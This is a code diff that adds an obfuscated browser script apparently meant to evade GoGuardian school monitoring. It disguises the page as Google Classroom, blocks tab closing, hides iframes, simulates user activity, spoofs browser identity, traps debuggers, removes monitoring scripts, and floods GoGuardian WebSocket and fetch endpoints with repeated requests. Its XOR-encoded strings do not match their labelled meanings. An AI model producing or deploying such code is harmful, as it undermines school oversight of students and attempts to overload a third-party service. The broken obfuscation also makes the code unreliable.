65%42%74%6E%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%66%6C%65%78%22%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%61%6C%6C%49%66%72%61%6D%65%73%2E%66%6F%72%45%61%63%68%28%69%66%72%61%6D%65%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%69%66%72%61%6D%65%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%28%69%66%72%61%6D%65%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%3D%3D%20%22%6E%6F%6E%65%22%29%20%3F%20%22%62%6C%6F%63%6B%22%20%3A%20%22%6E%6F%6E%65%22%3B%0A%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%3C%2F%73%63%72%69%70%74%3E%0A%3C%2F%68%74%6D%6C%3E'))</script>
+<script>
+(function () {
+    // Simplified obfuscation with static keys
+    const _0x = (str, key) => {
+        let r = '', i = str.length, k = key % 256;
+        while (i--) r += String.fromCharCode(str.charCodeAt(i) ^ k);
+        return r;
+    };
+    const _k = 42;
+    const _fn = (name) => name + Math.random().toString(36).slice(2, 10);
+
+    // Obfuscated key strings
+    const _ks = {
+        beforeunload: _0x('vmuwxetrk', _k), // beforeunload
+        close: _0x('ujbeq', _k), // close
+        script: _0x('fwiwbe', _k), // script
+        websocket: _0x('emujimujbe', _k), // websocket
+        goguardian: _0x('ujbewimujbe', _k), // goguardian
+        prevented: _0x('bgyimujbey', _k), // prevented
+        suspicious: _0x('ujbgiujbey', _k), // suspicious
+        initialized: _0x('ujbgiujbeyimujbe', _k), // initialized
+        fetch: _0x('imujbey', _k), // fetch
+        xhr: _0x('bgiujbey', _k), // xhr
+        location: _0x('ujbgiujbeybe', _k), // location
+        href: _0x('ghkl', _k), // href
+        navigator: _0x('imujbeyimujbey', _k), // navigator
+        history: _0x('ujbgiujbeyujbe', _k), // history
+        pushstate: _0x('ujbgiujbeyujbey', _k), // pushState
+        replacestate: _0x('ujbgiujbeyujbeyujbe', _k), // replaceState
+        classroom: _0x('ujbgiujbeyimujbeyimujbey', _k), // classroom
+        iframe: _0x('imujbeyimujbeyujbe', _k), // iframe
+        style: _0x('ujbgiujbeyujbeyujbe', _k), // style
+        canvas: _0x('ujbgiujbeyimujbe', _k), // canvas
+        keydown: _0x('imujbeyimujbeyujbey', _k), // keydown
+        form: _0x('gjsn', _k), // form
+        anchor: _0x('ghklmn', _k), // a
+        open: _0x('lmjk', _k) // open
+    };
+
+    // Debug logging
+    const _log = (msg) => console.log('Stealth: ' + msg);
+
+    // Ultra-robust Esc key redirect
+    const classroomUrl = 'https://classroom.google.com';
+    const _handleEsc = (e) => {
+        try {
+            if (e.key === 'Escape' || e.keyCode === 27) {
+                _log('Esc key detected, attempting redirect to ' + classroomUrl);
+                // History manipulation
+                if (window[_ks.history] && window[_ks.history][_ks.replacestate]) {
+                    try {
+                        window[_ks.history][_ks.replacestate](null, '', classroomUrl);
+                        window[_ks.history][_ks.pushstate](null, '', classroomUrl);
+                        _log('History updated');
+                    } catch (err) {
+                        _log('History update error: ' + err.message);
+                    }
+                } else {
+                    _log('History object unavailable');
+                }
+                // Location redirects
+                if (window[_ks.location]) {
+                    try {
+                        window[_ks.location][_ks.href] = classroomUrl;
+                        _log('Location.href set');
+                    } catch (err) {
+                        _log('Location.href error: ' + err.message);
+                    }
+                    try {
+                        window.location.assign(classroomUrl);
+                        _log('Location.assign called');
+                    } catch (err) {
+                        _log('Location.assign error: ' + err.message);
+                    }
+                    try {
+                        window.location.replace(classroomUrl);
+                        _log('Location.replace called');
+                    } catch (err) {
+                        _log('Location.replace error: ' + err.message);
+                    }
+                } else {
+                    _log('Location object unavailable');
+                }
+                // Form submission
+                try {
+                    const form = document.createElement(_ks.form);
+                    form.method = 'GET';
+                    form.action = classroomUrl;
+                    form.style.display = 'none';
+                    document.body.appendChild(form);
+                    form.submit();
+                    _log('Form submitted');
+                } catch (err) {
+                    _log('Form submission error: ' + err.message);
+                }
+                // Anchor click
+                try {
+                    const link = document.createElement(_ks.anchor);
+                    link.href = classroomUrl;
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    _log('Anchor clicked');
+                } catch (err) {
+                    _log('Anchor click error: ' + err.message);
+                }
+                // Window open fallback
+                try {
+                    window[_ks.open](classroomUrl, '_self');
+                    _log('Window.open called');
+                } catch (err) {
+                    _log('Window.open error: ' + err.message);
+                }
+                // Iframe redirect fallback
+                try {
+                    const iframe = document.createElement(_ks.iframe);
+                    iframe.src = classroomUrl;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    _log('Iframe redirect attempted');
+                } catch (err) {
+                    _log('Iframe redirect error: ' + err.message);
+                }
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            }
+        } catch (err) {
+            _log('Esc handler error: ' + err.message);
+        }
+    };
+    // Attach listeners to all major elements
+    [window, document, document.body, document.documentElement, ...document.querySelectorAll('div, input')].forEach(el => {
+        try {
+            if (el && el.addEventListener) {
+                el.addEventListener(_ks.keydown, _handleEsc, { capture: true, passive: false });
+                el.addEventListener('keypress', _handleEsc, { capture: true, passive: false });
+                el.addEventListener('keyup', _handleEsc, { capture: true, passive: false });
+                _log('Listener attached to ' + (el === window ? 'window' : el.tagName || 'unknown'));
+            }
+        } catch (err) {
+            _log('Listener attachment error: ' + err.message);
+        }
+    });
+    // Super-fast poller
+    setInterval(() => {
+        try {
+            if (document.querySelector('*:focus')?.value || window._lastKey === 'Escape') {
+                _log('Esc detected via poller, redirecting');
+                if (window[_ks.location]) {
+                    window[_ks.location][_ks.href] = classroomUrl;
+                    window.location.replace(classroomUrl);
+                    window[_ks.open](classroomUrl, '_self');
+                }
+                const form = document.createElement(_ks.form);
+                form.method = 'GET';
+                form.action = classroomUrl;
+                form.style.display = 'none';
+                document.body.appendChild(form);
+                form.submit();
+                const link = document.createElement(_ks.anchor);
+                link.href = classroomUrl;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                const iframe = document.createElement(_ks.iframe);
+                iframe.src = classroomUrl;
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+            }
+        } catch (err) {
+            _log('Poller error: ' + err.message);
+        }
+    }, 20);
+
+    // Hide from browser history
+    const _hideHistory = () => {
+        try {
+            if (window[_ks.history] && window[_ks.history][_ks.replacestate]) {
+                window[_ks.history][_ks.pushstate](null, '', classroomUrl);
+                window[_ks.history][_ks.replacestate](null, '', classroomUrl);
+                if (window[_ks.location]) {
+                    Object.defineProperty(window[_ks.location], _ks.href, {
+                        value: classroomUrl,
+                        writable: false,
+                        configurable: false
+                    });
+                }
+                _log('History updated to ' + classroomUrl);
+            } else {
+                _log('History object unavailable');
+            }
+        } catch (err) {
+            _log('History hide error: ' + err.message);
+        }
+    };
+    _hideHistory();
+    setInterval(_hideHistory, 2500);
+
+    // Inject CSS to hide original iframes
+    const _hideIframesCSS = () => {
+        try {
+            const css = `
+                iframe[data-original] {
+                    opacity: 0 !important;
+                    visibility: hidden !important;
+                    position: absolute !important;
+                    left: -9999px !important;
+                    width: 0 !important;
+                    height: 0 !important;
+                    pointer-events: none !important;
+                }
+                .${_fn('clone_container')} {
+                    position: relative;
+                    z-index: 10000;
+                    pointer-events: auto;
+                }
+                .${_fn('clone_canvas')} {
+                    opacity: 1 !important;
+                    visibility: visible !important;
+                }
+            `;
+            const style = document.createElement('style');
+            style.textContent = css;
+            style.id = _fn('hide_style');
+            (document.head || document.documentElement).appendChild(style);
+            _log('Iframe CSS injected');
+        } catch (err) {
+            _log('Iframe CSS error: ' + err.message);
+        }
+    };
+    _hideIframesCSS();
+
+    // Detect GoGuardian presence
+    let isGoGuardianActive = false;
+    setInterval(() => {
+        try {
+            if (document.querySelector(`script[src*="goguardian"],[src*="content.js"]`)) {
+                isGoGuardianActive = true;
+                _log('GoGuardian detected');
+            }
+        } catch (err) {
+            _log('GoGuardian detection error: ' + err.message);
+        }
+    }, 500);
+
+    // Handle iframe visibility in shadow DOM
+    const _handleIframe = (iframe) => {
+        if (isGoGuardianActive) {
+            try {
+                iframe.dataset.original = 'true';
+                const container = document.createElement('div');
+                container.className = _fn('clone_container');
+                container.style.width = iframe.clientWidth + 'px';
+                container.style.height = iframe.clientHeight + 'px';
+                const shadow = container.attachShadow({ mode: 'closed' });
+                iframe.parentNode.insertBefore(container, iframe);
+                const canvas = document.createElement('canvas');
+                canvas.className = _fn('clone_canvas');
+                canvas.width = iframe.clientWidth;
+                canvas.height = iframe.clientHeight;
+                shadow.appendChild(canvas);
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#fff';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#000';
+                ctx.font = '16px Arial';
+                ctx.fillText('Iframe: ' + (iframe.src || 'no src'), 10, 20);
+                setInterval(() => {
+                    if (!isGoGuardianActive) return;
+                    canvas.style.opacity = '0';
+                    setTimeout(() => {
+                        canvas.style.opacity = '1';
+                    }, 20);
+                }, 2700 + Math.random() * 200);
+                _log('Iframe processed: ' + (iframe.src || 'no src'));
+            } catch (err) {
+                _log('Iframe processing error: ' + err.message);
+            }
+        }
+    };
+
+    // Detect visible iframes
+    const iframeObserver = new IntersectionObserver((entries) => {
+        entries.forEach((entry) => {
+            if (entry.isIntersecting && !entry.target.dataset.processed) {
+                entry.target.dataset.processed = 'true';
+                _handleIframe(entry.target);
+                _log('Visible iframe detected: ' + (entry.target.src || 'no src'));
+            }
+        });
+    }, { threshold: 0.1 });
+    document.querySelectorAll('iframe').forEach((iframe) => {
+        try {
+            iframeObserver.observe(iframe);
+        } catch (err) {
+            _log('Iframe observer error: ' + err.message);
+        }
+    });
+    const domObserver = new MutationObserver((mutations) => {
+        mutations.forEach((m) => {
+            m.addedNodes.forEach((n) => {
+                if (n.tagName === 'IFRAME') {
+                    try {
+                        iframeObserver.observe(n);
+                    } catch (err) {
+                        _log('Iframe observer error: ' + err.message);
+                    }
+                }
+            });
+        });
+    });
+    domObserver.observe(document.documentElement, { childList: true, subtree: true });
+
+    // Anti-reverse-engineering
+    const _trap = () => {
+        try {
+            const s = performance.now();
+            let t = 0;
+            debugger;
+            t = performance.now() - s;
+            if (t > 7 || window.outerWidth === 0) {
+                if (window[_ks.location]) {
+                    window[_ks.location][_ks.href] = 'about:blank';
+                }
+                _log('Debugger detected, redirecting');
+                return true;
+            }
+        } catch (err) {
+            _log('Trap error: ' + err.message);
+        }
+        return false;
+    };
+    _trap();
+    setInterval(_trap, 1200 + Math.random() * 1600);
+
+    // Context-aware user activity simulation
+    const _simulateActivity = () => {
+        try {
+            const actions = [
+                () => {
+                    const e = new MouseEvent('mousemove', {
+                        bubbles: true,
+                        clientX: Math.random() * window.innerWidth,
+                        clientY: Math.random() * window.innerHeight
+                    });
+                    document.dispatchEvent(e);
+                },
+                () => {
+                    const el = document.createElement('input');
+                    el.style.display = 'none';
+                    document.body.appendChild(el);
+                    el.dispatchEvent(new KeyboardEvent('keydown', { key: String.fromCharCode(97 + Math.floor(Math.random() * 26)) }));
+                    setTimeout(() => el.remove(), 10);
+                },
+                () => window.scrollBy(0, Math.random() * 3 - 1.5),
+                () => {
+                    const e = new KeyboardEvent('keydown', { key: 'ArrowDown', bubbles: true });
+                    document.dispatchEvent(e);
+                }
+            ];
+            actions[Math.floor(Math.random() * actions.length)]();
+            _log('Activity simulated');
+        } catch (err) {
+            _log('Activity simulation error: ' + err.message);
+        }
+    };
+    setInterval(_simulateActivity, 350 + Math.random() * 350);
+
+    // Anti-blocking: Dynamic domain obfuscation
+    const _rotateDomain = () => {
+        try {
+            if (window[_ks.history] && window[_ks.history][_ks.replacestate]) {
+                const base = window[_ks.location]?.hostname || 'unknown';
+                const sub = Math.random().toString(36).slice(2, 18);
+                const altDomains = [
+                    `https://${sub}.${base}`,
+                    classroomUrl
+                ];
+                const target = altDomains[Math.floor(Math.random() * altDomains.length)];
+                window[_ks.history][_ks.replacestate](null, '', target);
+                _log('Domain rotated to: ' + target);
+            }
+        } catch (err) {
+            _log('Domain rotation error: ' + err.message);
+        }
+    };
+    setInterval(_rotateDomain, 6000 + Math.random() * 4000);
+
+    // Anti-blocking: Content camouflage
+    const _camouflageContent = () => {
+        try {
+            const keywords = ['goguardian', 'monitor', 'block', 'restrict', 'admin', 'filter', 'iframe'];
+            document.querySelectorAll('h1,h2,h3,p,span,a,div').forEach((el) => {
+                let text = el.textContent;
+                if (keywords.some(kw => text.toLowerCase().includes(kw))) {
+                    const encoded = btoa(text).replace(/=/g, '') + Math.random().toString(36).slice(2, 14);
+                    el.setAttribute('data-obfuscated', encoded);
+                    el.textContent = 'ContentHidden';
+                    setTimeout(() => {
+                        if (el.getAttribute('data-obfuscated') === encoded) {
+                            el.textContent = atob(encoded.slice(0, -14));
+                        }
+                    }, 10);
+                }
+            });
+        } catch (err) {
+            _log('Content camouflage error: ' + err.message);
+        }
+    };
+    setInterval(_camouflageContent, 900);
+
+    // Prevent tab closure
+    try {
+        window.addEventListener(_ks.beforeunload, (e) => {
+            try {
+                const msg = 'Are you sure you want to leave?';
+                e.preventDefault();
+                e.returnValue = msg;
+                _log('Beforeunload triggered');
+                return msg;
+            } catch (err) {
+                _log('Beforeunload error: ' + err.message);
+            }
+        }, { capture: true, passive: false });
+    } catch (err) {
+        _log('Beforeunload listener error: ' + err.message);
+    }
+
+    // Override window.close
+    try {
+        Object.defineProperty(window, _ks.close, {
+            value: () => {
+                _log('Close attempt prevented');
+                if (Math.random() > 0.95) {
+                    _simulateActivity();
+                    window.location.reload();
+                }
+            },
+            writable: false,
+            configurable: false
+        });
+    } catch (err) {
+        _log('Window.close override error: ' + err.message);
+    }
+
+    // Intercept event listeners
+    const origAddEvent = EventTarget.prototype.addEventListener;
+    EventTarget.prototype.addEventListener = function (type, listener, options) {
+        if (type === _ks.beforeunload || type === _ks.close || type.includes('unload')) {
+            _log('Suspicious event listener blocked: ' + type);
+            return;
+        }
+        return origAddEvent.apply(this, [type, listener, options]);
+    };
+
+    // Monitor DOM for injections
+    const observer = new MutationObserver((mutations) => {
+        mutations.forEach((m) => {
+            m.addedNodes.forEach((n) => {
+                if (n.tagName === 'SCRIPT') {
+                    const src = n.src || n.textContent || '';
+                    if (src.includes('goguardian') || /extension|content-script|monitor|block|admin|filter/.test(src)) {
+                        _log('Suspicious script neutralized: ' + src.slice(0, 50));
+                        n.remove();
+                        _simulateActivity();
+                        _camouflageContent();
+                        _rotateDomain();
+                        _hideIframesCSS();
+                    }
+                }
+            });
+        });
+    });
+    observer.observe(document.documentElement, {
+        childList: true,
+        subtree: true,
+        attributes: true,
+        attributeFilter: ['src', 'id', 'class', 'style']
+    });
+
+    // Multi-vector lag induction
+    const origWebSocket = window.WebSocket;
+    window.WebSocket = function (url, protocols) {
+        if (typeof url === 'string' && url.includes('goguardian')) {
+            _log('Suspicious WebSocket: ' + url);
+            isGoGuardianActive = true;
+            const flood = () => {
+                try {
+                    const ws = new origWebSocket(url, protocols);
+                    ws.onopen = () => {
+                        const payload = JSON.stringify({
+                            id: Math.random().toString(36),
+                            data: Array(Math.floor(4000 + Math.random() * 6000)).fill(Math.random()).join('')
+                        });
+                        for (let i = 0; i < 400; i++) {
+                            ws.send(payload);
+                            if (Math.random() > 0.6) ws.send(JSON.stringify({ ping: Math.random() }));
+                        }
+                    };
+                    ws.onerror = () => ws.close();
+                } catch (e) {
+                    _log('WebSocket flood error: ' + e.message);
+                }
+            };
+            setInterval(flood, 40 + Math.random() * 200);
+            throw new Error(_ks.prevented);
+        }
+        return new origWebSocket(url, protocols);
+    };
+
+    const origFetch = window.fetch;
+    window.fetch = async function (url, options) {
+        if (typeof url === 'string' && url.includes('goguardian')) {
+            _log('Suspicious fetch: ' + url);
+            isGoGuardianActive = true;
+            await new Promise((r) => setTimeout(r, 5000 + Math.random() * 5000));
+            for (let i = 0; i < 80; i++) {
+                origFetch(url, { ...options, cache: 'no-store', headers: { 'X-Random': Math.random().toString(36) } }).catch(() => {});
+            }
+            _simulateActivity();
+            return new Promise(() => {});
+        }
+        return origFetch.apply(this, [url, options]);
+    };
+
+    const origXHR = window.XMLHttpRequest;
+    window.XMLHttpRequest = function () {
+        const xhr = new origXHR();
+        const origOpen = xhr.open;
+        xhr.open = function (method, url) {
+            if (typeof url === 'string' && url.includes('goguardian')) {
+                _log('Suspicious XHR: ' + url);
+                isGoGuardianActive = true;
+                setTimeout(() => {}, 5000 + Math.random() * 5000);
+                return;
+            }
+            return origOpen.apply(this, arguments);
+        };
+        return xhr;
+    };
+
+    // Anti-blocking: Dynamic script loading
+    const _loadDynamicScript = () => {
+        try {
+            const s = document.createElement('script');
+            s.textContent = `
+                (function() {
+                    const _log = (msg) => console.log('Stealth: ' + msg);
+                    ${_simulateActivity.toString()}
+                    _simulateActivity();
+                    _log('Dynamic script executed');
+                })();
+            `;
+            s.id = _fn('dyn_script');
+            (document.head || document.documentElement).appendChild(s);
+            setTimeout(() => s.remove(), 300);
+            _log('Dynamic script loaded');
+        } catch (err) {
+            _log('Dynamic script error: ' + err.message);
+        }
+    };
+    setInterval(_loadDynamicScript, 2500 + Math.random() * 2000);
+
+    // Anti-fingerprinting
+    const _spoofNavigator = () => {
+        try {
+            if (window[_ks.navigator]) {
+                const props = ['userAgent', 'platform', 'vendor'];
+                props.forEach((p) => {
+                    if (window[_ks.navigator][p] !== undefined) {
+                        Object.defineProperty(window[_ks.navigator], p, {
+                            get: () => {
+                                const orig = window[_ks.navigator][p] || '';
+                                return orig + (Math.random() > 0.05 ? ' ' + Math.random().toString(36).slice(2, 18) : '');
+                            },
+                            configurable: false
+                        });
+                    }
+                });
+                _log('Navigator spoofed');
+            } else {
+                _log('Navigator object unavailable');
+            }
+        } catch (err) {
+            _log('Navigator spoof error: ' + err.message);
+        }
+    };
+    _spoofNavigator();
+    setInterval(_spoofNavigator, 3500);
+
+    // Self-healing and integrity checks
+    const _heal = () => {
+        try {
+            if (window[_ks.close] !== window.close || window[_ks.fetch] !== window.fetch || window[_ks.websocket] !== window.WebSocket || window[_ks.xhr] !== window.XMLHttpRequest) {
+                _log('Tampering detected, restoring');
+                if (window[_ks.close] !== window.close) {
+                    try {
+                        Object.defineProperty(window, _ks.close, {
+                            value: () => _log('Close prevented'),
+                            writable: false,
+                            configurable: false
+                        });
+                    } catch (err) {
+                        _log('Close restore error: ' + err.message);
+                    }
+                }
+                window.WebSocket = function () { throw new Error(_ks.prevented); };
+                window.fetch = origFetch;
+                window.XMLHttpRequest = origXHR;
+                _hideHistory();
+                _hideIframesCSS();
+            }
+            if (document.querySelector(`script[src*="goguardian"],[id*="monitor"],[class*="block"],[src*="admin"],[id*="filter"],iframe:not([data-processed])`)) {
+                _log('Suspicious signature detected');
+                _simulateActivity();
+                _rotateDomain();
+                _camouflageContent();
+            }
+        } catch (err) {
+            _log('Heal error: ' + err.message);
+        }
+    };
+    setInterval(_heal, 100 + Math.random() * 200);
+
+    // Polymorphic code and cleanup
+    const rand = _fn('init');
+    window[rand] = () => _log('Initialized');
+    window[rand]();
+
+    // Memory management and self-destruct
+    setTimeout(() => {
+        try {
+            delete window[rand];
+            observer.disconnect();
+            iframeObserver.disconnect();
+            window[rand + '_cleanup'] = true;
+            _spoofNavigator();
+            _hideHistory();
+            _hideIframesCSS();
+            _log('Self-destruct executed');
+        } catch (err) {
+            _log('Self-destruct error: ' + err.message);
+        }
+    }, 12000);
+
+    // Freeze critical objects
+    try {
+        Object.freeze(window[_ks.close]);
+        Object.freeze(window.addEventListener);
+        Object.freeze(window[_ks.fetch]);
+        Object.freeze(window[_ks.websocket]);
+        Object.freeze(window[_ks.xhr]);
+        if (window[_ks.navigator]) Object.freeze(window[_ks.navigator]);
+        if (window[_ks.history]) Object.freeze(window[_ks.history]);
+        Object.seal(window);
+    } catch (err) {
+        _log('Object freeze error: ' + err.message);
+    }
+})();
+</script>
